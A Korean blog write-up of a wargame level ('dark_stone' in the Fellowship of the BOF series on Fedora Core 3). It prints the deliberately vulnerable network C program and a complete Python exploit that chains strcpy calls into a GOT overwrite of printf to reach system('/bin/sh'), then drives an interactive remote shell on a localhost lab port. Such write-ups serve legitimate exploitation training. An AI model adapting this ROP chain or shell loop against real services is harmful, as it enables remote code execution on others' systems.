---
title: FC3 evil_wizard -> dark_stone
slug: fc3-evil_wizard
date: 2017-01-06 23:33:00 +0900 KST
categories: [write-up]
markup: mmark
---

dark_stone 코드

```c
/*
    The Lord of the BOF : The Fellowship of the BOF
    - dark_stone
    - Remote BOF on Fedora Core 3
    - hint : GOT overwriting again
    - port : TCP 8888
*/

#include <stdio.h>

// magic potion for you
void pop_pop_ret(void)
{
    asm("pop %eax");
    asm("pop %eax");
    asm("ret");
}

int main()
{
    char buffer[256];
    char saved_sfp[4];
    int length;
    char temp[1024];

    printf("dark_stone : how fresh meat you are!\n");
    printf("you : ");
    fflush(stdout);

    // give me a food
    fgets(temp, 1024, stdin);

    // for disturbance RET sleding
    length = strlen(temp);

    // save sfp
    memcpy(saved_sfp, buffer+264, 4);

    // overflow!!
    strcpy(buffer, temp);

    // restore sfp
    memcpy(buffer+264, saved_sfp, 4);

    // disturbance RET sleding
    memset(buffer+length, 0, (int)0xff000000 - (int)(buffer+length));

    // buffer cleaning
    memset(0xf6ffe000, 0, 0xf7000000-0xf6ffe000);

    printf("%s\n", buffer);
}
```

hell_fire -> evil_wizard와 문제풀이 방법이 거의 같음.

똑같이 팝팝리턴으로 꿀빨면 된다.

아래는 풀이코드

```python
#!/usr/bin/python
from struct import pack
from socket import *

p = lambda x : pack('<L', x)

ppr = 0x080484f3
bss = 0x08049870

printf_plt = 0x0804862c
printf_got = 0x0804984c

strcpy_plt = 0x08048438
strcpy_got = 0x08049858

system = ( 0x080483e8 + 12, 0x08048178 + 4, 0x08048740, 0x08048138 )
binsh = 0x00833603

payload = ''
payload += 'A' * 268
payload += p(strcpy_plt) + p(ppr) + p(bss + 0) + p(system[0])
payload += p(strcpy_plt) + p(ppr) + p(bss + 1) + p(system[1])
payload += p(strcpy_plt) + p(ppr) + p(bss + 2) + p(system[2])
payload += p(strcpy_plt) + p(ppr) + p(bss + 3) + p(system[3])
payload += p(strcpy_plt) + p(ppr) + p(printf_got) + p(bss)
payload += p(printf_plt) + p(binsh)

s = socket(AF_INET, SOCK_STREAM)
s.connect(( '127.0.0.1', 8888 ))
s.send(payload + "\n")

print s.recv(1024)

while True:
    try:
        cmd = raw_input('')
    except EOFError:
        break
    if cmd == 'exit':
        break
    s.send(cmd + "\n")
    result = s.recv(1024)
    print result
s.close()
```

자꾸 안되서 write-up 따라했다. ㅡㅡ

`p(printf_plt) + "BBBB" + p(binsh)`는 안되는데
`p(printf_plt) + p(binsh)`가 되는 이유를 모르겠다.

스택 한 칸 비워야되는 걸로 알고 있는데...
